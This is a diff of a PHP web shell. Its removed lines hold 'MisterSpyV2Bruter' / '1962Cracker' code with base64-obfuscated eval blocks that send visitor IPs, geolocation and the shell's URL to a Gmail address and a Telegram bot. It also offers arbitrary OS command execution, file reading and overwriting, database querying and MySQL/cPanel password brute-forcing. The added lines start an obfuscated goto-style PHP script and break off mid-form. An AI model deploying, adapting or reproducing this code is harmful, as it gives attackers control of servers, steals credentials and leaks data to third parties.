@@ -1,514 +1,59 @@
-<title>MisterSpyV2Bruter</title>
 <?php
-@set_time_limit(0);
-@error_reporting(0);
-eval(base64_decode('ZnVuY3Rpb24gWEJfT1MoJFVTRVJfQUdFTlQpew0KCSRPU19FUlJPUiAgICA9ICAgIlVua25vd24gT1MgUGxhdGZvcm0iOw0KICAgICRPUyAgPSAgIGFycmF5KCAnL3dpbmRvd3MgbnQgMTAvaScgICAgICA9PiAgJ1dpbmRvd3MgMTAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNi4zL2knICAgICA9PiAgJ1dpbmRvd3MgOC4xJywNCgkgICAgICAgICAgICAgICAgJy93aW5kb3dzIG50IDYuMi9pJyAgICAgPT4gICdXaW5kb3dzIDgnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNi4xL2knICAgICA9PiAgJ1dpbmRvd3MgNycsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBudCA2LjAvaScgICAgID0+ICAnV2luZG93cyBWaXN0YScsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBudCA1LjIvaScgICAgID0+ICAnV2luZG93cyBTZXJ2ZXIgMjAwMy9YUCB4NjQnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNS4xL2knICAgICA9PiAgJ1dpbmRvd3MgWFAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgeHAvaScgICAgICAgICA9PiAgJ1dpbmRvd3MgWFAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNS4wL2knICAgICA9PiAgJ1dpbmRvd3MgMjAwMCcsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBtZS9pJyAgICAgICAgID0+ICAnV2luZG93cyBNRScsDQoJICAgICAgICAgICAgICAgICcvd2luOTgvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyA5OCcsDQoJICAgICAgICAgICAgICAgICcvd2luOTUvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyA5NScsDQoJICAgICAgICAgICAgICAgICcvd2luMTYvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyAzLjExJywNCgkgICAgICAgICAgICAgICAgJy9tYWNpbnRvc2h8bWFjIG9zIHgvaScgPT4gICdNYWMgT1MgWCcsDQoJICAgICAgICAgICAgICAgICcvbWFjX3Bvd2VycGMvaScgICAgICAgID0+ICAnTWFjIE9TIDknLA0KCSAgICAgICAgICAgICAgICAnL2xpbnV4L2knICAgICAgICAgICAgICA9PiAgJ0xpbnV4JywNCgkgICAgICAgICAgICAgICAgJy91YnVudHUvaScgICAgICAgICAgICAgPT4gICdVYnVudHUnLA0KCSAgICAgICAgICAgICAgICAnL2lwaG9uZS9pJyAgICAgICAgICAgICA9PiAgJ2lQaG9uZScsDQoJICAgICAgICAgICAgICAgICcvaXBvZC9pJyAgICAgICAgICAgICAgID0+ICAnaVBvZCcsDQoJICAgICAgICAgICAgICAgICcvaXBhZC9pJyAgICAgICAgICAgICAgID0+ICAnaVBhZCcsDQoJICAgICAgICAgICAgICAgICcvYW5kcm9pZC9pJyAgICAgICAgICAgID0+ICAnQW5kcm9pZCcsDQoJICAgICAgICAgICAgICAgICcvYmxhY2tiZXJyeS9pJyAgICAgICAgID0+ICAnQmxhY2tCZXJyeScsDQoJICAgICAgICAgICAgICAgICcvd2Vib3MvaScgICAgICAgICAgICAgID0+ICAnTW9iaWxlJyk7DQogICAgZm9yZWFjaCAoJE9TIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7DQogICAgICAgICAgICAkT1NfRVJST1IgPSAkdmFsdWU7DQogICAgICAgIH0NCg0KICAgIH0gICANCiAgICByZXR1cm4gJE9TX0VSUk9SOw0KfQ0KZnVuY3Rpb24gWEJfQnJvd3NlcigkVVNFUl9BR0VOVCl7DQoJJEJST1dTRVJfRVJST1IgICAgPSAgICJVbmtub3duIEJyb3dzZXIiOw0KICAgICRCUk9XU0VSICA9ICAgYXJyYXkoJy9tc2llL2knICAgICAgID0+ICAnSW50ZXJuZXQgRXhwbG9yZXInLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9maXJlZm94L2knICAgID0+ICAnRmlyZWZveCcsDQogICAgICAgICAgICAgICAgICAgICAgICAnL3NhZmFyaS9pJyAgICAgPT4gICdTYWZhcmknLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9jaHJvbWUvaScgICAgID0+ICAnQ2hyb21lJywNCiAgICAgICAgICAgICAgICAgICAgICAgICcvZWRnZS9pJyAgICAgICA9PiAgJ0VkZ2UnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9vcGVyYS9pJyAgICAgID0+ICAnT3BlcmEnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9uZXRzY2FwZS9pJyAgID0+ICAnTmV0c2NhcGUnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9tYXh0aG9uL2knICAgID0+ICAnTWF4dGhvbicsDQogICAgICAgICAgICAgICAgICAgICAgICAnL2tvbnF1ZXJvci9pJyAgPT4gICdLb25xdWVyb3InLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9tb2JpbGUvaScgICAgID0+ICAnSGFuZGhlbGQgQnJvd3NlcicpOw0KICAgIGZvcmVhY2ggKCRCUk9XU0VSIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7DQogICAgICAgICAgICAkQlJPV1NFUl9FUlJPUiA9ICR2YWx1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJEJST1dTRVJfRVJST1I7DQp9DQpkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdHTVQnKTsNCiRkYXRlID0gZGF0ZSgiZCBNLCBZIik7DQokdGltZSA9IGRhdGUoImc6aSBhIik7DQokdXNlcmFnZW50ID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KJHNfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOw0KJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokSVBUWiA9IGdldGVudigiUkVNT1RFX0FERFIiKTsNCiRDT1VOVFJZVFogPSBzaW1wbGV4bWxfbG9hZF9maWxlKCJodHRwOi8vd3d3Lmdlb3BsdWdpbi5uZXQveG1sLmdwP2lwPSRJUFRaIik7DQokQ09VTlRSWSA9ICRDT1VOVFJZVFotPmdlb3BsdWdpbl9jb3VudHJ5TmFtZTsNCiRDSVRZID0gJENPVU5UUllUWi0+Z2VvcGx1Z2luX2NpdHk7DQokUkVHSU9OID0gJENPVU5UUllUWi0+Z2VvcGx1Z2luX3JlZ2lvbjsNCiRDX0NPREUgPSAkQ09VTlRSWVRaLT5nZW9wbHVnaW5fY29udHJ5Y29kZTsNCiRUaW1lem9uZSA9ICRDT1VOVFJZVFotPmdlb3BsdWdpbl90aW1lem9uZTsNCiRTeW1ib2wgPSAkQ09VTlRSWVRaLT5nZW9wbHVnaW5fY3VycmVuY3lzeW1ib2w7DQokbWVzc2FnZSAgPSAifC0tLStbTkVX44CQ8J+RqOKAjfCfkrvjgJFNL1NdKy0tLXxcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+RpOOAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4+g44CRSVAJOiAiLiRJUFRaLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+Tn+OAkVN5c3RlbSA6ICIuWEJfT1MoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKS4iXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkPCfjIzjgJFCcm93c2VyIDogIi5YQl9Ccm93c2VyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDinKjjgJFVc2VyIEFnZW50IDogIi4kdXNlcmFnZW50LiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+Vte+4j+OAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRVGltZSBab25lIDogIi4kVGltZXpvbmUuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRQ291bnRyeSA6ICIuJENPVU5UUlkuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRUmVnaW9uIDogIi4kUkVHSU9OLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+MkOOAkUNpdHkgOiAiLiRDSVRZLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+Su+OAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn5GB44CRSG9zdCA6ICIuJHNfcGF0aC4iXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkPCfkYDjgJFGaWxlIDogIi4keF9wYXRoLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ4o+z44CR4pSB4pSB4pSB4pSBWytdXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkOKMmu+4j+OAkVRpbWUJOiAiLiR0aW1lLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+TheOAkURhdGUJOiAiLiRkYXRlLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+UjeOAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn5Oh44CRVHJhY2sgSVAgOiBodHRwczovL3d3dy5pcC10cmFja2VyLm9yZy9sb29rdXAucGhwP2lwPSIuJElQVFouIlxuIjsNCiRtZXNzYWdlIC49ICJ8PT09K1vwn5KWQkMuRFLwn5KWXSs9PT18XG4iOw0KJHJlY2VpdmVyQWRkcmVzcyA9ICJrYWxpeDB4YWxpa0BnbWFpbC5jb20iOw0KJFRPS0VOID0gIjUyNjg0MDE5OTM6QUFFMVA0YzVQSGVSQ1RHY2EwTEtaSVd6bS15eVllM1ljQzQiOw0KJENIQVRfSUQgPSAiMTg5NjQ2NDI5NSI7DQokc3ViamVjdCAgPSAi8J+Slk5ld/CfkaRbTS9TXfCfkaR88J+MkEZyMG06Ii4kSVBUWi4i8J+SliI7DQptYWlsKCRyZWNlaXZlckFkZHJlc3MsJHN1YmplY3QsJG1lc3NhZ2UpOw0KZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiLiRUT0tFTi4iL3NlbmRNZXNzYWdlP2NoYXRfaWQ9Ii4kQ0hBVF9JRC4iJnRleHQ9IiAuIHVybGVuY29kZSgkbWVzc2FnZSkuIiIgKTs'));
-$Getconfig = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQp9DQplbHNlIHsgJHZpc2l0YysrOyB9DQpAc2V0Y29va2llKCJ2aXNpdHoiLCR2aXNpdGMpOw==";
-eval(base64_decode($Getconfig));
-
-	function in($type,$name,$size,$value,$checked=0)
-	 {
-	 $ret = "<input type=".$type." name=".$name." "; if($size != 0)
-	 {
-	 $ret .= "size=".$size." "; }
-	 $ret .= "value=\"".$value."\""; if($checked) $ret .= " checked"; return $ret.">"; }
-
-	class my_sql
-	 {
-	 var $host = 'localhost'; var $port = ''; var $user = ''; var $pass = ''; var $base = ''; var $db = ''; var $connection; var $res; var $error; var $rows; var $columns; var $num_rows; var $num_fields; var $dump; function connect()
-	 {
-	 switch($this->db)
-	 {
-	 case 'mysqli': if(empty($this->port))
-	 {
-	 $this->port = '3306'; }
-	 if(!function_exists('mysqli_connect')) return 0; $this->connection = @mysqli_connect($this->host.':'.$this->port,$this->user,$this->pass); if(is_resource($this->connection)) return 1; $this->error = @mysqli_errno()." : ".@mysqli_error(); break; case 'MSSQL': if(empty($this->port))
-	 {
-	 $this->port = '1433'; }
-	 if(!function_exists('mssql_connect')) return 0; $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass); if($this->connection) return 1; $this->error = "Can't connect to server"; break; case 'PostgreSQL': if(empty($this->port))
-	 {
-	 $this->port = '5432'; }
-	 $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'"; if(!function_exists('pg_connect')) return 0; $this->connection = @pg_connect($str); if(is_resource($this->connection)) return 1; $this->error = @pg_last_error($this->connection); break; case 'Oracle': if(!function_exists('ocilogon')) return 0; $this->connection = @ocilogon($this->user, $this->pass, $this->base); if(is_resource($this->connection)) return 1; $error = @ocierror(); $this->error=$error['message']; break; }
-	 return 0; }
-	 function select_db()
-	 {
-	 switch($this->db)
-	 {
-	 case 'mysqli': if(@mysqli_select_db($this->base,$this->connection)) return 1; $this->error = @mysqli_errno()." : ".@mysqli_error(); break; case 'MSSQL': if(@mssql_select_db($this->base,$this->connection)) return 1; $this->error = "Can't select database"; break; case 'PostgreSQL': return 1; break; case 'Oracle': return 1; break; }
-	 return 0; }
-	 function query($query)
-	 {
-	 $this->res=$this->error=''; switch($this->db)
-	 {
-	 case 'mysqli': if(false===($this->res=@mysqli_query('/*'.chr(0).'*/'.$query,$this->connection)))
-	 {
-	 $this->error = @mysqli_error($this->connection); return 0; }
-	 else if(is_resource($this->res))
-	 {
-	 return 1; }
-	 return 2; break; case 'MSSQL': if(false===($this->res=@mssql_query($query,$this->connection)))
-	 {
-	 $this->error = 'Query error'; return 0; }
-	 else if(@mssql_num_rows($this->res) > 0)
-	 {
-	 return 1; }
-	 return 2; break; case 'PostgreSQL': if(false===($this->res=@pg_query($this->connection,$query)))
-	 {
-	 $this->error = @pg_last_error($this->connection); return 0; }
-	 else if(@pg_num_rows($this->res) > 0)
-	 {
-	 return 1; }
-	 return 2; break; case 'Oracle': if(false===($this->res=@ociparse($this->connection,$query)))
-	 {
-	 $this->error = 'Query parse error'; }
-	 else
-	 {
-	 if(@ociexecute($this->res))
-	 {
-	 if(@ocirowcount($this->res) != 0) return 2; return 1; }
-	 $error = @ocierror(); $this->error=$error['message']; }
-	 break; }
-	 return 0; }
-	 function get_result()
-	 {
-	 $this->rows=array(); $this->columns=array(); $this->num_rows=$this->num_fields=0; switch($this->db)
-	 {
-	 case 'mysqli': $this->num_rows=@mysqli_num_rows($this->res); $this->num_fields=@mysqli_num_fields($this->res); while(false !== ($this->rows[] = @mysqli_fetch_assoc($this->res))); @mysqli_free_result($this->res); if($this->num_rows)
-	 {
-	$this->columns = @array_keys($this->rows[0]); return 1;}
-	 break; case 'MSSQL': $this->num_rows=@mssql_num_rows($this->res); $this->num_fields=@mssql_num_fields($this->res); while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res))); @mssql_free_result($this->res); if($this->num_rows)
-	 {
-	$this->columns = @array_keys($this->rows[0]); return 1;}
-	; break; case 'PostgreSQL': $this->num_rows=@pg_num_rows($this->res); $this->num_fields=@pg_num_fields($this->res); while(false !== ($this->rows[] = @pg_fetch_assoc($this->res))); @pg_free_result($this->res); if($this->num_rows)
-	 {
-	$this->columns = @array_keys($this->rows[0]); return 1;}
-	 break; case 'Oracle': $this->num_fields=@ocinumcols($this->res); while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++; @ocifreestatement($this->res); if($this->num_rows)
-	 {
-	$this->columns = @array_keys($this->rows[0]); return 1;}
-	 break; }
-	 return 0; }
-	 function dump($table)
-	 {
-	 if(empty($table)) return 0; $this->dump=array(); $this->dump[0] = '##'; $this->dump[1] = '## --------------------------------------- '; $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s"); $this->dump[3] = '## Database: '.$this->base; $this->dump[4] = '##    Table: '.$table; $this->dump[5] = '## --------------------------------------- '; switch($this->db)
-	 {
-	 case 'mysqli': $this->dump[0] = '## mysqli dump'; if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; $this->dump[] = $this->rows[0]['Create Table'].";"; $this->dump[] = '## --------------------------------------- '; if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
-	 {
-	 foreach($this->rows[$i] as $k=>$v)
-	 {
-	$this->rows[$i][$k] = @mysqli_real_escape_string($v);}
-	 $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
-	 break; case 'MSSQL': $this->dump[0] = '## MSSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
-	 {
-	 foreach($this->rows[$i] as $k=>$v)
-	 {
-	$this->rows[$i][$k] = @addslashes($v);}
-	 $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
-	 break; case 'PostgreSQL': $this->dump[0] = '## PostgreSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
-	 {
-	 foreach($this->rows[$i] as $k=>$v)
-	 {
-	$this->rows[$i][$k] = @addslashes($v);}
-	 $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
-	 break; case 'Oracle': $this->dump[0] = '## ORACLE dump'; $this->dump[] = '## under construction'; break; default: return 0; break; }
-	 return 1; }
-	 function close()
-	 {
-	 switch($this->db)
-	 {
-	 case 'mysqli': @mysqli_close($this->connection); break; case 'MSSQL': @mssql_close($this->connection); break; case 'PostgreSQL': @pg_close($this->connection); break; case 'Oracle': @oci_close($this->connection); break; }
-	 }
-	 function affected_rows()
-	 {
-	 switch($this->db)
-	 {
-	 case 'mysqli': return @mysqli_affected_rows($this->res); break; case 'MSSQL': return @mssql_affected_rows($this->res); break; case 'PostgreSQL': return @pg_affected_rows($this->res); break; case 'Oracle': return @ocirowcount($this->res); break; default: return 0; break; }
-	 }
-	 }
-	 if(!empty($_POST['cccc']) && $_POST['cccc']=="download_file" && !empty($_POST['d_name']))
-	 {
-	 if(!$file=@fopen($_POST['d_name'],"r"))
-	 {
-	 err(1,$_POST['d_name']); $_POST['cccc']=""; }
-	 else
-	 {
-	 @ob_clean(); $filename = @basename($_POST['d_name']); $filedump = @fread($file,@filesize($_POST['d_name'])); fclose($file); $content_encoding=$mime_type=''; compress($filename,$filedump,$_POST['compress']); if (!empty($content_encoding))
-	 {
-	 header('Content-Encoding: ' . $content_encoding); }
-	 header("Content-type: ".$mime_type); header("Content-disposition: attachment; filename=\"".$filename."\";"); echo $filedump; exit(); }
-	 }
-	 if(isset($_GET['phpinfo']))
-	 {
-	 echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
-	 if (!empty($_POST['cccc']) && $_POST['cccc']=="db_query")
-	 {
-	 echo $head; $sql = new my_sql(); $sql->db = $_POST['db']; $sql->host = $_POST['db_server']; $sql->port = $_POST['db_port']; $sql->user = $_POST['mysqli_l']; $sql->pass = $_POST['mysqli_p']; $sql->base = $_POST['mysqli_db']; $querys = @explode(';',$_POST['db_query']); echo '<body bgcolor=#e4e0d8>'; if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else
-	 {
-	 if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else
-	 {
-	 foreach($querys as $num=>$query)
-	 {
-	 if(strlen($query)>5)
-	 {
-	 echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>"; switch($sql->query($query))
-	 {
-	 case '0': echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>"; break; case '1': if($sql->get_result())
-	 {
-	 echo "<table width=100%>"; foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES); $keys = @implode("&nbsp;</b></font></td><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;", $sql->columns); echo "<tr><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>"; for($i=0;$i<$sql->num_rows;$i++)
-	 {
-	 foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES); $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]); echo '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>'; }
-	 echo "</table>"; }
-	 break; case '2': $ar = $sql->affected_rows()?($sql->affected_rows()):('0'); echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>"; break; }
-	 }
-	 }
-	 }
-	 }
-	 echo "<br><title>1962Cracker By Akram Stelle</title><form name=form method=POST>";
-	 echo in('hidden','db',0,$_POST['db']); echo in('hidden','db_server',0,$_POST['db_server']); echo in('hidden','db_port',0,$_POST['db_port']); echo in('hidden','mysqli_l',0,$_POST['mysqli_l']); echo in('hidden','mysqli_p',0,$_POST['mysqli_p']); echo in('hidden','mysqli_db',0,$_POST['mysqli_db']); echo in('hidden','cccc',0,'db_query');
-	 echo "<div align=center>"; echo "<font face=Verdana size=-2><b>Base: </b><input type=text name=mysqli_db value=\"".$sql->base."\"></font><br>"; echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>"; echo "</form>"; echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-	function ccmmdd($ccmmdd2,$att)
-	{
-	global $ccmmdd2,$att;
-	echo '
-	<table style="width: 100%" class="style1" dir="rtl">
-		<tr>
-			<td class="style9"><strong>???H?/strong></td>
-		</tr>
-		<tr>
-			<td class="style13">
-					<form method="post">
-						<select name="att" dir="rtl" style="height: 109px" size="6">
-	';
-	if($_POST['att']==null)
-	{
-	echo '						<option value="system" selected="">system</option>';
-	}else{
-	echo "						<option value='$_POST[att]' selected=''>$_POST[att]</option>
-							<option value=system>system</option>
-	";
-
-
-	}
-
-	echo '
-							<option value="passthru">passthru</option>
-							<option value="exec">exec</option>
-							<option value="shell_exec">shell_exec</option>
-						</select>
-							<input name="page" value="ccmmdd" type="hidden"><br>
-							<input dir="ltr" name="ccmmdd2" style="width: 173px" type="text" value="';if(!$_POST['ccmmdd2']){echo 'dir';}else{echo $_POST['ccmmdd2'];}echo '"><br>
-							<input type="submit" value="???>
-					</form>
-
-			</td>
-		</tr>
-		<tr>
-			<td class="style13">
-	';
-
-			if($_POST[att]=='system')
-			{
-	echo '
-						<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
-						system($_POST['ccmmdd2']);
-	echo '					</textarea>';
-
-
-			}
-
-			if($_POST[att]=='passthru')
-			{
-	echo '
-						<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
-						passthru($_POST['ccmmdd2']);
-	echo '					</textarea>';
-
-
-			}
-
-
-
-
-
-			if($_POST[att]=='exec')
-			{
-
-	echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
-						exec($_POST['ccmmdd2'],$res);
-					echo $res = join("\n",$res);
-	echo '					</textarea>';
-
-
-			}
-
-
-
-
-
-
-
-			if($_POST[att]=='shell_exec')
-			{
-
-	echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
-					echo	shell_exec($_POST['ccmmdd2']);
-	echo '					</textarea>';
-
-
-			}
-	echo '
-			</td>
-		</tr>
-	</table>
-	';
-
-	exit;
-	}
-
-	if($_POST['page']=='edit')
-	{
-
-	$code=@str_replace("\r\n","\n",$_POST['code']);
-	$code=@str_replace('\\','',$code);
-	$fp = fopen($pathclass, 'w');
-	fwrite($fp,"$code");
-	fclose($fp);
-	echo "<center><b>OK Edit<br><br><br><br><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
-	exit;
-	}
-
-
-
-
-
-
-
-		if($_POST['page']=='show')
-		{
-		$pathclass =$_POST['pathclass'];
-	echo '
-	<form method="POST">
-	<input type="hidden" name="page" value="edit">
-	';
-
-		$sahacker = fopen($pathclass, "rb");
-	echo '<center>'.$pathclass.'<br><textarea dir="ltr" name="code" style="width: 845px; height: 404px">';
-	$code = fread($sahacker, filesize($pathclass));
-	echo $code =htmlspecialchars($code);
-	echo '</textarea>';
-		fclose($sahacker);
-	echo '
-	<br><input type="text" name="pathclass" value="'.$pathclass.'" style="width: 445px;">
-	<br><strong><input type="submit" value="edit file">
-	</form>
-	';
-			exit;
-		}
-
-
-
-
-		if($_POST['page']=='ccmmdd')
-		{
-		echo ccmmdd($ccmmdd2,$att);
-		exit;
-		}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-	if($_POST['page']=='find')
-	{
-	if(isset($_POST['usernames']) && isset($_POST['passwords']))
-	{
-			if($_POST['type'] == 'passwd'){
-					$e = explode("\n",$_POST['usernames']);
-					foreach($e as $value){
-					$k = explode(":",$value);
-					$username .= $k['0']." ";
-					}
-			}elseif($_POST['type'] == 'simple'){
-					$username = str_replace("\n",' ',$_POST['usernames']);
-			}
-			$a1 = explode(" ",$username);
-			$a2 = explode("\n",$_POST['passwords']);
-			$id2 = count($a2);
-			$ok = 0;
-			foreach($a1 as $user )
-			{
-					if($user !== '')
-					{
-					$user=trim($user);
-					 for($i=0;$i<=$id2;$i++)
-					 {
-							$pass = trim($a2[$i]);
-							if(@mysqli_connect('localhost',$user,$pass))
-							{
-									echo "<cpanel>$user|$pass</cpanel><br />";
-									$ok++;
-							}
-					 }
-					}
-			}
-			echo "<hr><b>You Found <font color=green>$ok</font> cPanel (1962Cracker)</b>";
-			exit;
-	}
-	};
-
-eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
- ?>
-
-
- <form method="POST" target="_blank">
-  <strong>
-   <input name="page" type="hidden" value="find">
-
-   </tr>
+ goto j7jZA; Xkwy1: $safe_mode = ini_get("\163\x61\146\x65\137\x6d\157\144\x65"); goto xOGR_; s6Ehk: ?>
+"></strong></td>
+    </tr>
    <tr>
-   <td>
-   <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
-   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
-  <strong>User :</strong></td>
-   <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="40" rows="10" name="usernames"></textarea></strong></td>
-   </tr>
-   <tr>
-   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
-  <strong>Pass :</strong></td>
-   <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="40" rows="10" name="passwords"></textarea></strong></td>
-   </tr>
-
-   <tr>
-   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
-  <strong>Type :</strong></td>
-   <td valign="top" bgcolor="#151515" colspan="5">
-   <span class="style2"><strong>Simple : </strong> </span>
-  <strong>
-  <input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
-   <font class="style2"><strong>/etc/passwd : </strong> </font>
-  <strong>
-  <input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
-  </span>
-   </td>
-   </tr>
-   <tr>
-   <td valign="top" bgcolor="#151515" style="width: 139px"></td>
-   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="start">
-
-   </td>
-   <tr>
+   <td valign="top" bgcolor="#151515" style="width: 139px"><strong></strong></td>
+   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="show"></strong></td>
+       </tr>
+ <input name="page" type="hidden" value="show">
  </form>
 
-<form method=post>
